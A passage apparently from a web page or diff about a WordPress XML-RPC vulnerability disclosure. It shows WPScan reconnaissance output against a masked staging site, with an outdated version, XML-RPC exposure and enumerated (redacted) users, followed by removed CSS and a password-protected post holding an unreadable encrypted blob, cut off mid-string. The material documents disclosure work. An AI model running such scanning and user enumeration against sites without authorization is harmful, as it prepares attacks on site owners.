Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line">[+] WordPress readme found: https://staging.&lt;SITE&gt;.com/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line">[+] The external WP-Cron seems to be enabled: https://staging.&lt;SITE&gt;.com/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line">[+] WordPress version 6.7.4 identified (Outdated, released on 2025-09-30).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - https://staging.&lt;SITE&gt;.com/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.4&lt;/generator&gt;</span><br><span class="line"> |  - https://staging.&lt;SITE&gt;.com/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.4&lt;/generator&gt;</span><br><span class="line">[i] User(s) Identified:</span><br><span class="line">[+] &lt;REDACTED&gt;</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By: Rss Generator (Aggressive Detection)</span><br><span class="line">[+] &lt;REDACTED&gt;</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - https://staging.&lt;SITE&gt;.com/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> | Confirmed By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line">[+] &lt;REDACTED&gt;</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - https://staging.&lt;SITE&gt;.com/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Oembed API - Author URL (Aggressive Detection)</span><br><span class="line"> |   - https://staging.&lt;SITE&gt;.com/wp-json/oembed/1.0/embed?url=https://staging.&lt;SITE&gt;.com/&amp;format=json</span><br><span class="line"> |  Yoast Seo Author Sitemap (Aggressive Detection)</span><br><span class="line"> |   - https://staging.&lt;SITE&gt;.com/author-sitemap.xml</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line">[+] &lt;REDACTED&gt;</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line">[+] &lt;REDACTED&gt;</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
 
-#password-form-container {
-  max-width: 360px;
-  margin: 60px auto;
-  padding: 30px;
-  background: #1d2021;
-  border: 1px solid #3c3836;
-  border-radius: 8px;
-  box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-}
-
-#password-form-container h3 {
-  color: #d5c4a1;
-}
-
-#password-input {
-  width: 100%;
-  box-sizing: border-box;
-  padding: 12px;
-  margin-bottom: 12px;
-  border: 1px solid #7c6f64;
-  border-radius: 4px;
-  font-size: 16px;
-  background-color: #282828;
-  color: #d5c4a1;
-  transition: border-color 0.2s;
-}
-
-#password-input:focus {
-  border-color: #fabd2f;
-  outline: none;
-}
-
-#password-protected-content button {
-  width: 100%;
-  padding: 12px;
-  background: #8ec07c;
-  color: #1d2021;
-  border: none;
-  border-radius: 4px;
-  cursor: pointer;
-  font-size: 16px;
-  transition: background-color 0.2s;
-}
-
-#password-protected-content button:hover {
-  background-color: #80b16a;
-}
-
-#error-message {
-  color: #fb4934;
-  margin-top: 10px;
-  text-align: center;
-  font-size: 14px;
-}
-</style>
-<div id="password-protected-content">
-  <div id="password-form-container">
-    <h3>WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment</h3>
-    <p>This content is password protected.</p>
-    <input type="password" id="password-input" placeholder="Enter password">
-    <button onclick="decryptContent()">Unlock</button>
-    <div id="error-message" style="display: none;">Incorrect password. Please try again.</div>
-  </div>
-</div>
-
-<script>
-const encryptedData = {"salt":"uYvDHhJizfUD1mMCdoqUsw==","iv":"D9kSCyFo+bQH+jVs","authTag":"SbZiQ7KlCmMuYUByzkLjPg==","encrypted":"+4yaBIIsPBY8HsVHFNFhlg1aLFBHXS1x5tUgo0iu9xWEZnvLQPTa2shWDe95bIiwaRw70kKurvTwTtcDR9MoDuQ7fXwWNhfcoHc+qI1eZ3NN/nCRd/ruIaMag56PAJHQB9Q2Q0INSb7XmFyIu6PGQ45uO9MLy2tmOAxPGF8BfAaA6ZfMu0GyNkuTNxCdF5QnOXc95cghASGYGIfSLJW47NjS2TVV9aX7kQg8CcXrBPAzYPCNAonuYskTFuMEbV+AZ7m6LvBN9l3bYAW0sUUSHYE0Q55KOpJVbV0jdwTPcOAsbwzLZ4ibumvSbXRZg8AIQB0s4BOQMjOoEH3yoW5NSHcTE4FmB8OIdNAAQr31SUV+76JOmqPG83lhcMhyJ7h6zBYhtPhm4A5lUBj8UgbFVyqiG9/3F7NDLKMJ69cxuTpUl8rZe9PkzLAWcq4Uc8PVVjiME6iIbUbb5okYI6oOiNkJAy+8uS/2gvuJyad+eH455RC9wvr/crBPIynuvohmmCofJ+afp+4h5XyYtKUGTDyIzQHosjktFknU+zq9fM7Ubdd4hQNKsv8DaWQjB6qlgAnjusU8gfxx5l5Kqvyu3Uc8qhQJjY48dLWzFVnt8zfTrlGNwYtKEag9JFuyJ01XQC2VZBSxw5CvG0Y2B9mYNPWPj/ajWcE0XjzhDdtWCEfLZZ5GXZZIhTF5S9RYGh3HNqiBzZc9ttdrhmpNUF5Iys7nD7Of3Wc1pegxpNFia2rAyunA02f/zW3kP9S48nXvvuMP2HVs5Rhzk/c/BndWnYjQP7bxOi6TkEYGgszBKBcWgUxxWRiDKz9WWJBCmKUcUxQVFIZk+EoWBTnzvIa/YV+pZCUD/051LtafVdvjLtR6a7TQLnmHm4oiaSYjKOS7XxPYfT6vnPcug3DwZo5+PVxTiLIRjagWpMmOMlJJrjptrPQRod0RHyjCm0jYX5dn3xUHXuj8ni8fwUyEb49HshTQbpdyicThdxqPELrBsvhrDPOrlvfYKX5jVWbB6ccva8M15B2iPCPuoNtChfPJhh8K/RdmuS75aKIPKxzq2WgZiKFOeWU9R8sBkcklGI9gd+astKABLx1bQ4Avva3ioaGt3THCoaZN0dhre/PBo8Ccj9NtQLs54MSJbfbJau1kOXjTbN37qt4MkxuuyZDsCvfog3yqY5GRJyTgZwidwLx8CNIY01WP3PHVEizpcRkV5n8rymH9XXkqVySVNhZH/CHsV9uHJuMer/PUMOI3BIC25EdvXWS8ZdOp1YSl3WmclDJAtEKgKTFlUhNuett63x5o1HxG/axNIl+9cqactMfS640kZIcRoH/MzUKBEMnYfn5/tTZi3zJtngCIm8X5jS0t36PjE2APG/RVlTkyVbmBy/GWz0eRY6EJinlMeo5Y5LyJbSIHYoqgzfpPL7Y0busIWo3PXEdJorcH+yCTUTNHQ2p/pfbgQAn0znM8rBuCqqn6qIhAETiH7xPludW6fe8JcjNVWEr5Rq0cl2ekB/86vrvLxPBBUwlqrhGh3/9ZBm1ke0qkOUujkdwYPWNQuxofpepW6aJHORSovyAg4wSOa5/Gwp3hRideO++b3TT3fiitVcs/HAORmfXHTDPzq0Mdp+pVaAYxgimc/xOWpkby9v9uRgSI/9nSgm/xVHpyW9Mhhd0rDmGCohYs8uSDeUnOzkv+xPSZgGRJSJSeGPaJboFNMBCZE6gM68x2PXhFidCL97EojSldJSReAtuMa/wSl4MXa6oMGT2yD8KB50Ds+VYctKBJncENOPXq8fTwyLmv5ycXN9vIt/NNwMVVKO1E0lRxKVn8ZdK/SYLdLevL60BisCSfJuDJ5IByE1Iba7iaw3R5ZyH+KDVODLieLKLuvZEuT80hNsIFtPso3xH1u22i0U4mdty+Gx5XAmG1nJOWMtCh7zlUwxmau3GTFzS35UZBslNNGtm3hHc9HUPt/BYKRy+jvLqUU19oPSK1wuF9sZ+2sEkb5BDJyu6BRAasnpLG1M9cnJsE69ZWQl+Tiq1SeKl51LefPs7CP+6p1DFrZH4rYIArOr5DjWeiLM9LcWUShlo9eNLsOjleyHK4zOqy21wmgH5me7Ua1zp8n/+sNYV/EFHxEJMHb6WmdSs+hIyxxA0KCvclG/HE8CFm2LEJw/5e7czfVu61JTZDv7tqxGehLx1z+NKbTayyj288JIw0nURi/TfDB1qZ/BsMzly369whegvhfTKRLdO7gHq1pHRxB2hDoanGX39r3ZUUpnl8kbMEoUobiQEuJJGGEDfbgUoTdiXYXJz85fps9w7JMUqPYUElRepxxavjI/Uyy2B68ib2CkHJyfrUdWOZikWACiT3HQpHvPgzXio6UCoHxbP5N/EUC/DIZL1uAM8clRRMHbhbDDsftYkbSsP1MeBUWnwYpxMx1S65FD8yCXsWy0gxgyuiv504DrDEvZT5hZTiNvUCeIKLjdbQoLRP00H6EOos24nI3Vdmm7+Xk9w/1JK/rzlwyqV9pKwjhTu6i7F28Xt/X6ncM6xug9lphdHyBXJO1JTtYPzfmQ6KNWuh1HI7U7zgNfISpRrpeag+ASDmHuk1PCkdf3FQOdzAGdU9qM4Y7RRIkqNJMdabIv/e2oK5/X3ux32LmNnpcQUOjv3KJ/+i8oeiFtrslMvwhF52oeiD2kOoSClv1JTa50rqgnmvulGp3CrTOEPZ4s6YKmushm5YJyiny1zqyx4K8W2DhumtzcK9Paw3R1Ig2yrjwINa/+y5BCTOTmQIi8LJ1ohWxuuHxOIVUboQm7xNxs2mtHeH/8QuA9oSxa2+EnoS9w1sDoF6fEHlMsaZfX9JEe8TmjlLudjf/h0EWHwASRlUhpva5yL7PET8/stQNNK3SDGskkcTzgNefSgLna3OwnAoZOGVA+N9OSBf7i9j1QiUj8qgpZ11fYMxZ9+vqnPGmuJJxEXlVnqePO8E+a46euThWl0xxN0xhcAao+U4ipJNdQibBXVOuv2naFBKafbntb48BKi2Vt/89UraNjxUWuz8aqlB3FF7/IeycnMJsZTmHl2h/Yl/XGLBRWQLvuI7KNQ4wclCzGlcf913QIbPTK7mQiu9wL1WFWloniqK0iWsC7yPR0P+xvExhDydl8bNgGAuWD4QcLLXTfvOPrDzrUrnXlZwn+rnsLUxAgaA6ldfwvepKAnEArpYiNjOqre0kk4kdItCAw1Q0sZpgVq2t2u2wgiClQ3600ewCRbvFBXiw/wWj/s16y5AOEZZO12Y2oF8azG5hAsaLOnGIIWpdFOSQhWhpGMp3zuIsI+GBCQ1Q9k/n3GcrG91FbZFLQAFTG0yNWYn6HyfcxhDmXbLooI6SO5XHrBeBj5hpWNRx8MkIcSSZWZXDFHAsQogpcqg3eii1Dg5mh71haXh/hb+CwvBEcqpv68hZQR/FxxLbL5oY5i+hTYW8iAXFER8eD2Da8ksnulqr+NKQRqYXO9aPeIPlfzfYYVOslm/zECgCSihljdn/aWOo8b1NRzvyeymyCskyIJrq+QFrgm23+Ux0NhpB7zhLdgBbiKMmH0QZuExIPyBCGfsc2AldUE9BOQj6LJGKfwpMrtSmIaCkD11adQcPTp/cHvrJt3Wivvp9aJbHE5DvmXeQ9vsJ21wxlMNPqvDsGEbXiRDaGim4txM+x2ro9wcHkjcc/MXCQykITbgNF0CXNvu0AMLeL9YN94HHCPITJi8jnQ3ltanxAmYFoL3ujS+5oOwykT748Pt3+XJiOy5YK62XJjsUbZmQ80hmL9KGv9+STogvJ+gSs81Cw6fYGGKgZEATSm0WsbQED0jm/9GLCcNEjx+BrDK1o4d5Zyod+Z0BbyhHbxCpIfH5tDcAYCenI/E4Ay480iKtFyn/ClNDUjYWvjL8iIDbzKhDI4Bjg2X7pV/q4K9vFWUGpbbpvui+tKi163XJ234SUUG25TGVffhIoaMrEJEU1ajyZKpbWFypBqoCPBRw6eYPQ1NNQ89jvNhMO+t3vN3Wq05Mlqlt6y42EB7YPVSJqQcvramnvgm88B64uCef2L693MS+9UEbjiazcCSPKj5mJK/95cc7Yu/alsx0v6sdfg5XeQ3ijg2xxobTAU19RMW2axhhCatYfY0uufMZOW44ow5U4ynq6JJN+GDTURxHtl30sSBwi4Z8hQ3yxYjtj8A1tQyWIhM/y8W03nVJ6wd36E1u+qY/HLb0kAIgi4b+G1jI7qX2oSibEs/POJMp9KrLfaQRVl01LxYneFEgKq2SLbnL0vSO7VEP8aQzZg8OkEoXNvFn3XCsVIQcGbxSt5u3o4XNLL7fWz4+MhEziZ3Edxb6FvLV6et70DeLb1OMdW/wTPEBesvj6uK3WkFI5kwPssU+gmPgkHfwJNIxVRUdG4ViFfV8Ok94CW5J8VWmEFHoPccVhdo/aPBFDv3IxU+s15WTXjeFaFLWlnYGXpZ0YJVnWJtzzK7i8xOtHfc5PLacJGjC7vPNSTGGePWxzBjjM8W7xIyoCMlW+PSDpHOUYGTyBWDaeVa8tgSQQzXvlMSDSy9tz6intbGiiTfh/Ll+LdLOfyaJRn4xDtgKLpOz5BJgS/OF1LVjXPCiIm/Z3CecPCHLHT+ZDqfwpaSh0qfO3WfEe4fHb4If3ZgAGa2XN3sy19lWyhITLRF6KQBclFLYgiR8LfCVhsUsDvyclJpB8BxsmEgkx6AFWP9/SIEVoYFT9IrxdD1jzIae1aD9Zgv7sCx2KL/079qJc64wjOM8MkHqe6UfBDiyr+ODDWxgmNSA9wYaXos3LPxPT6bXcVkX/xgezRugT8gcKksLX815bTqWOcbC8zVdf7nvyapXJKpXLmtZpz5z6janwQBCSc06mw4OpHLcrpVo6ZLEj8myzV3D0ThDvDJ7wNX7doYnFXPasQO/2+dVn+uoRrraW1usbNWeDsEWtje/ZGD2FGJrU7jBKtoi3grXnsY1XjWPOc/6RdWbCEbKb59t3WL6VnS5BjCDWlta6Eg+xoVB5bMi+FAwnqW6IxDBQ6JCgot/KbhoCDY6oZR4DUTlVba1EbDr2ZsuWPN/FRPZgX7UwEzcedGjL9f/8CS411IqmJM1d3Wi/WmJS80VEx6DgFhnWpT4q2h251hgAAL/kbyGABtod+PNkmqGu+YjA51ciYEz6SjcmGHfSUwfNqOTbuaky7bJoqL0k36fzTqp4uPaCcHrPzXSghVeOOi3kS2Zm9Fc7rrJzlbnvauPabtYMNOXJX4krufVl2U49D3aTZB4dCrSla9UOrSarZjjHAHjyMWUnHzsZeS+qP7gjG8g93hrocoatRNJvqnIRJ/Oe5FL0v6M0622yiPIuzsSfrepk8VSfmkEYI/fTGyC8HOWaFI9bkdPxxJcMiyQ1PMY9qMOU6j8d40dNnqG7sq2ufSe9xLDJ/gr9YTX9fAI1wIvcHPfzkQm2w/g71FQ5E1akqtsEyJ2aC1YgB08rMI+HzqOJg/pUPy5MLBiw8eLxL6AAq4ela2d5N6CSWIGCTFbVH7R410NUiWNVYVZWBMXNQc7BIAUC1krLpo4aasDNM0JCcTt4IifSAuVGtFtvAA8lL5tNywVrMclJW/Ewftcll1YaNzMq4YRK3BDXaiCLWKZMYWVUVkM5TafTqFsq10C8t6zuodeIekilhtyIDbDeOeRJTVYsEWGiqQOz91bX+oxFAKjRxHEWk5VXpLkRirNltr1Nn3TJaqN6J4QCOrSkYwnLj3W9pgsbNmL0I3pi7MrK12MEj0cmPM8QzE2ev8/JHdYP7k6FYD2OqYlcD1cARr8RRKwQlitrY9SjkNcoB18G5hWvTB8QNBgZolD1lbIjaElkQM928HEDd+ObR/1UhkeSW3RjoWQ0LsjzelM86VWHJff33Ouz6LiHFusnlHogMfRXqNJ4Y1P8dG5WE0sviearNIvP/bJJh+u+e60Wg47SjhV//BxYOYesq3eNf9Yy2KvNtOr1geNlDeJqgIKXq1/RolUSSObgcEI8+NO7imKpnVgEe15fJZ+TOl2382iXL5ncp9nI5vf/oOHkoQOgPv7GYgfq6/k2eH3ZWltsAyu7HKSZqnTFmrSI+nVb2mLlHNfELyTYYBdnamSFpnGhq+dXxgzwYnyIvQHzI/zF+PtON6FOKXDdDPT6vqGkqMcdOABrpaKif7Cm6gdKdQWHaz9awzo8HOv6aVW5Is3nLjASVDMTBv5ZSZBdDJP3F3kXYC01ijfTHOXAaQXm+XUdQLcgbU/2yf3s543nVWy81SNzB1sdM0buCiap7uMmWLSZ3bCdh/9WneaxazU8UT528Bi+H7B4NFeLZIfCvt+VHQG4HBTpo/IvZd4YPDKruzEzBpmFWW77v0I6vQrnFjKKUrDmge5Gh5W/up3zWsK/IJ61dhoTIVajir7k9FDDCIcHs5DqOlbSChGy9Hl2GJmL+ypwmtJBHkRAfcFa7rLSX1OMd65jFNsJ3Uqm+KoE0P3c1nKbbY6W6CzzrtzsCG0X+iRJYATWq2cCgtCctde61znNNTRR6+RqGsL7/hp6UMbzUE/VzQ3Z6OFtRmipnBeUqg/9v2cKcGwSpOEl/d6X7ZJrNPlc8CIvNnnY5eaYZh72854o5OckRr3qiSditnrf0Cb+SD9o4pxfTMkm/Ma/5VvCfn6oB5ZRAKNIB6lnfIRfwjyAzHelS3cO1JbySmMffWaUFx1PsMkG4Pi6Ng+Z250sCH16M/7BeWqOueBuxJdPK/XtSSD/O3Ujk2kNJ5R+m94IgGT2clnVTLMeek55Gmfdvex40jA9rnOcXlQj/H2rSDkG4xCZ5FZyzAKUa2VrKUhNb5euxMXGWXfsQs4+CZB1t9j+zB1A/cdA1KxWPGnfkb+f+RxcmE8R8FrIiU2PpMkYbVNsBr99TDgghAbaxUC6I0PESq6iR8Hgb+xbsFFshrHK1Ok1ZT6CEEEf3e5BOlGgHSnOSHn4WEXR62Hds9HsJy3exD5aCLBG+y/CPPIh87TSzHWBOjhLCujM/ssk76PIia2MQG1Xt0o+x5B4yaINaFVK1H/8p7t1htqdaeLoWexbEcmQhP5Ru2ua/0ICiPArfvxuoibrK3YhKXtOMjSnGUphISbPqM/n6+Q/ukbj85vXcKLMVbfel9sgnjBkU1qKUwUyDzyRU/+mFgHf8v4xthgDzyJ95GXaNZnVOfYcptg5TRESH1Sw4s41E7QBtsMvxnGzTaZ+/oWEYAYSRlOuJq/jaPZE4R0fWanVhdYJgTbL7KGV37myAIXnrmij3QToeFWaDkYEKV3UPIY49p3Iis+ORqkV4GuipVeq6rozQebHIRGmfr3zvcJoNWchSuEz30sRwIlbNV8K7U1avLzEbcis5NYGbV8Cm2WSNhODSUPfyDl19qDfkNKTYrAmBxNXpfVs0HPGP29Ak712ltMqgsY30B/nxfjT7WjqlHbU0S7v6EvkF0v1uzFbNfqkhMUIiuNmuL27LcWgoHZHd6uefg8xuJ2c3KrzFjRbQHjohCtKdKztrcEpiXl4m12kv7Vg3d1UzkSRsfQg4XvAVoQftFx9YTgMzpCfxQAbdoOKNjk7cD/KzS18pmza7DccMeoGJ4RwYawaBmz1+q7VjJv6LnvIyKNatCWrRPRpxXK2NTYbj5EKr66gBYvFEGv2iT5JnUCkfIIwLgpRf9tYVXw3d01OhMiLV+RBZE/3jzYmKcDC3uwugrm/kDPDMdipAVjIwOF9vP2pTqeIlAmoyvFgiUEnz6REnId/mcRfOO8nDQAvNjYlfKz8OhfF/fS75WSCU/8kdyTwqnyBObe2/c/8X+YQJbeEfW/lpmIWI08wZegDiFJHh0kpHx2jDZpKicUx6+/65AvvO0oROvGW3YK3eSN4NeGu4TJZfqtD3jnaRNuJKpQajNNNx0ibgwmLMoqPyiyOOnvSjPVYLAQrZV9yldl08G6AJ8PBSoJHrNKf+JXhRHQWhWEmdUnXlnpMFY8ZWtt6slDhiIUjTZT7Zo1ETauhkBG/d8ChOEQMy0krUUs+/6JaXhSF1bESYILtC0ctd4vIh732um+1weWQhMVRg96F+oCE61KGreZXDPoOMhvDTDEOLLgPcVAy05OmChn6QKWRPDXA4D9qEPwx3zaiZdEqp3H8lGde0jpvWdVcZqG7pqjAPuurDyT2obg8qNDWpRK0UbGEasmn6wSTqg7Pw7wq1QGkSlc12FkHvGrOL5ExgUl4tzGKaEcUNnFPO/QiO48MDS2W1MsKvWYPDKc0XfZIWwkMQZ+tPNxQ7HBtUKhgDBUa7XlYgI4eSt1Kkl2WK503j1ut1p5gskAi5U+BE4zNC7JMGWvascT2NFZYbeOjl/vPEJxB+EsEVO7PC0cngH5MYgXgBNpjrGK95esCVm1a3cK6b6qdcEuUyhrGq3AF5M7ThU+3CahthExmVXeV7KSl4VwdvqVV4PrXS5sSsKj0Y5XE8NZZBQSe2jNvpw/bkG8M3l3L2YKy22GFEqeLhyDgl1OH84Gwneg87e6wBdDIgBTRy4sQHCT4D6Ap1RUiglrvmDmP6IPB/a6WqDo5BaL//Dg31HWHM+lTiEHa0To8wtkm5za8wpbn5Vl0a75k0lnx510Oa9hhHqrrKb72f17uQ9x6AjRKqd0G8XZCEMwIbX9WdFry0DAR4+rGDn0mbZUJhZOdfGrNc/L3u+T8StaFidqRscz6nOpv+Jc1bMqnIJMuvv4GAHq4mUvw7NHxnvKUMWY0WfgSgSpVx88nMRLWPDffUtSromAfu3jMUbaY6d2uk71wssVXvilSK1fYD4N/DA7yRfvtEJlP94MBN5FB1G1FSfZ42ERwNMGfJ9i5bR5ZnUYl1aQaiGpHMzWDFOpjXNNPlvdxvPZfzhJSq4j7AudKV5+zRC5JOSY6C6+pmYIQa0lkeQfttIqQKa42wOyIwLn60JB6wGjHVjtoVQL1V48x00VV/tGEx2Br8ihmYkAePvG/YwGgtdcCYh027tY4GZ/O7m86egJ7oedRdarRlH7udlnNuPE0RYv6AECI2TwYVUGsYE93ybOLFW3OYw7FYGcUFKqay1OuINSCnHuVeoRcf2bx9g0zft+afejaVWtZvNCvZijOItb6E10pbLSEX6oqz81T9av3Sd7Wo4qHV4ozpULdUPgdk6HfAzEgSvkLTIwJ14O6mhxyKUBBofcXBof0rL/+Ygiye8a/Otnlfi/i+huLZMZK6rFttAj3QWZVtTsj5mRuFIHM4pBdUdBjhLLsIdIvaJZqh7z7XCUdCGpB15DjnOZxbllesB++OF6E/NyOJdUnS9WwOlyUSy66Tirviej6xiZYcH5cJvimPjMLU+Rn24JdPs8eefww8u8lR0jHwcYZdzlC2d5uxV11YI9Unq4ZpzG+p81fXMf16mURalGUxtsbQcqtkNliwYZkhYOc6fGQBd3ZsWdXn3yHoagLUrHWC0iKySxAxbuNuYTwPt8MdWsEdSkGSjGJ5l9HFD3ASVZy7M1oaA+S6YIXCsagUE4d6EOlf7hWEfJZqzE+GoTjcIdNDXWPmJDFqzGhLaGLIVB0SCNZu1wcbRBqezr1wJlGNfp7SklO1pQF35/mdZ2jIy1wdkkI89tfDYXaGPKe4p/mbQh2RN99P3gp30g6RJJcDod6YpGMXOi0pTfelh2Kc7S/L9IpAm6R5//e80b5ZgMSh9zG61RbeIi0rcVzubncU1gxDQgZ50YgZz4gFAhaV/gfz0MiPdgywQzvX9oCHu8BF+KIlkDTYWB+uasKVbzI+sei2kHp8/2d2liD9mVvY9gXRDkiI4QiFEnSCJaEn2nT1a0Fi4gyJS/uah7bwEFfgfW0WBd/vXERTwgD9dRnXNF0l/RRtxYmI1L8eJMVI3eNbuQnYcPuCyllhZIon/GG91tR5hCgZB+PCb4scKzeaRKSdvCgvL852XGa+Mjg8///GBDaKwrR1t6FzmXLEi0JW06axvb+8bdHxSQR1yf+KrxqaZT1tlMtciFWb37ZKo9J/7tUlhwyaBKz7xGcwjE48854pQ7MWRM7SqoJhVpSZHKz3ibfEjXtclltursnDZIcN0Gx8EXN/MemN0q4HzYwYsQyM/viOBrMhmN1LLmIw/l4ZU+SloigqgLAhXn+XwUW0wN4O6TlcW8mjW9JXWwqCMSK+u+9GtR/ec34kJLj1VEXLQcq+T2ZXaVR+JRkrqcr8UIMInx7ELsiKvQ74B3GwUg2Y2gPFn6MU40ui5YpZ6HijBJry3lcuQpB7Jenl0Bp9aZ9Qsu87lGZ9PXYs8q2HSapszhuut7CNg1QWGEic3N15aRza02YfpiqoIH448wUPFKTfYy8A1irp+OnoYfhs8FDK7cnGsE2J1u7AyRUWF6Fg+GADDDQTCyeQcSua0H3VlRjSuE+FTeJBlDHjZHyn6K8YjUx4i9FkIblSTbXU1MebIpBXC6Ok2nACn8UvYPWmZnR11v6kEo/lN1kUJS1tYvTv+z3mrIs8ODXvFRfJUaxKgkVdGKUwyEdTDcxfKumgsXLrc3fmOEzrQHfafE8uqjEMTAlrOgvUYSFtPCZO1GQ/nZxZJ/cYlVK1Mx/LqRstwA5Y6RQ7Raz+FUrBQb3PO6yw7GAL5lCSbVaF4jiSmGLpVl05OgU5iCPmBI7hHYCIPBuq9+GXswaLLWZ+zIuPXmCHGB08+rE6GmSyof4Sxp9ir5Gpc0kQJe0xnfl/q4sK8MEq5Eo0wTCUfw5vm7VrQtS4oPWxX3EWigAjDl9WWon5HrFHdxRjMYzbotvg0U4DC3lr1FD+gvdvhY3G2ZcIMvfpqu82vPmSEnwr9jsThFNTXwEB+L6W+OD+Sf+oICRyZw2jEwgrrS5AE4gQD/zS5qLbipbfZwtnf4YTMrV01SN5SpGbsNBVPcgIzeSR2pCd6CdyxqCUUvk2foY8Wv89OFB3zbQ5rbIoIjrs1bl3+OrWLAXbM0l8qLdq2sFE8PUOSURZC563Z4GXVLnSAc3vPMuRqup5ocRm99D1mliuxbCWw1LEw3ur7iuJ9v258SwjBvuKDJ/ywcWI9VKsgsWNf1ZnYoro7XKJvesPip//ToLCslNJker4tqHTFLYtokYdizP8FkFGi8rihRfcrO8VOMcAXQDBzXCOWAcx5Lwlhz1tct94HORTn+nQqW35/+BYIm+YDserdEolZw0+n0YmwtY2n85MH+zg9EsJE7U/1kRZtDdcpgjs2yppQNQPwy7eKlK4Dbyo5Dh/Jn5uk54liDUJ2OvPz79gb3qPbDPHPpxtlE9C++rjrcPx/lZnNOdUHM8Zc1ZmApmjmoAXSLUPtCr+ntMj8bUWKWXtmfle3igRRRGNpzBO3YfOjroujevra8iFktcF2k9Z27SlWQCsXpXRIa56VJ1/LrIonbvNAGM2EhLhZ2dv1BTZp4EtftZ0KzrpKlllwgskOpedpV/1WfNi4u3RhXh4PTNWhK9nNkR0adm1SHKdOaPBWo/cPQdnZ28pi4pRDipzZQmrXokvaoiHUVCvMmKHzPdfTNJuHLTR46PMZOL+JWT2xae2NS11BPUe8vduKqyWoKdDb1DdCCqXe19Z1mMrlmZwdIyi/Jgoub7AltLxieqq6v32M+/0a4aXataf5gzSrrosq2xGsX/n3VI5GtZ1xpT8XbIkcAiWSUwE4HgI0hmUMi7n3xWOvbcg1CtzxQYVZ+Nu8+C4Zm4x2heUnEp2DtyDDlE6sWQHtDnKyE046EPUGpW/+6cN8jfzRf5pheoJCrsRDO0gl3wGim6ilZUFjQvdUIlekXkgdbCPEAcbY2oj94UBEheQLkWlRY6aTdSeS0slhr2q1SO8Fp5I5P0h/VPxkl+xKTaE+55fgV0Xn3y9W/SeP1HUmBs4+mbikRzHg9LgRRO4hJR9FqQCOC42dN3iIdNw5yl/PIVQFd8o2HS4BQ+NAMqJtk2wKHNI1IUYcN5JqlxRQsfgtZKUQCuJKbu/BeqvwLJ2DLKQsejmTKRqTEWGGRE8ZVlQA+gElOamV6hiOclzPfMiO/UQ8B28oYNFdYsySK2Q7wjJdloR8CqqhhP+uIUk3vWBDper+Th/7UALoDIW4dhgEGZYfaq8aWM7SdE3lwZWduO/089Ut9Y4dhnk9AGDoAc/i3+fD4dv4KrRKMdeXdDr17kYgf7mmhUtj1t3/G4Mv0DGm1DcNeAleYhWa1Lp3rj7Zyrl2BvgxNyLpHKXilF8jD5WpXIshEoBOoTVxivikCnFXdoI4oGUOay9R1DBWrMSpEQgxsqRPEMLRnYt8rVC2TZ/EbAMkzuzJa7TKo08tf/TCw9ybPjVnerwCSyM9uf343zCpl6sm5CaEH2iZwcK7rsh8F+1JO/VItXftZuRqq7wtPVyh4wfNlKqNCw1G4IPWOrWCJkbBLUTkfRICPS59J4k7rIVWcufELNSjRgE2sYDKBJRI4bSbF9hzsEGJJX6jIqyFRlx6MSQVyW8LJCXJuSzwm7UJ44rYM+eKK0R9/AR+gfW0EaNluKSYvAQaYRdRR+hPsH4U5/1cgBHJo+tyY9dnfu3++j2hiGyASMu/kXtdMmNSmMec0XHpULGWn9fnO1pshFeE/FFX6Gt+5JitxxlYQ0g28VEccPsyI1GdddZKrYnZQy6hWTXyTURhOWy2xfeIXW1odkghzfSM5NVRitzuOB8XlmcA1rE+pQl89NbvC8Hxu/hmkINVWeg6w6GClcaHFnwqsSjJ38Wl4LeNqV6SpiQCODO155BR0PaUuHfPXKxD8aFrmiFoJV1jZVvL5hWFs4RrRiKmELtLdCxczNudGkapZjbv9E7thJo2hPI+N7Kewfzl5AYXFBbpTLA5prcz72DiBjW9k73cJuo0pnRMZbDUG5HwK3/iy3cxixV8UcUMfy9Zgl8zn3+s1uFQGmM1R2Uq6WkS/9FMWMOgl+YWItCN9zZYUbKVATH+rAp3c9aT43qa4NlxFxq9Bg3YnDSYkru8+FkUyS8Vp6UEpIc0wtTK6d2lBXSxBTtTc1aOLSvjak++NxnGjXpoOooEq1PML16psiD9pHVYFsTSC2mxl6zBtqHeu70S6twvQ0odv7d3MoaaELbS7jNlQT5uqbhK8WBwlBKkEulfCH0FSK6MBGGFwhAyGXV+eRGt+a5iUppNuNbcm+hFhF461OU/um1P5oEXNoEK71WYTvI3LAHsdpb+03hlbor63bXbmPU03xKAnLOxs1msBGpWv4P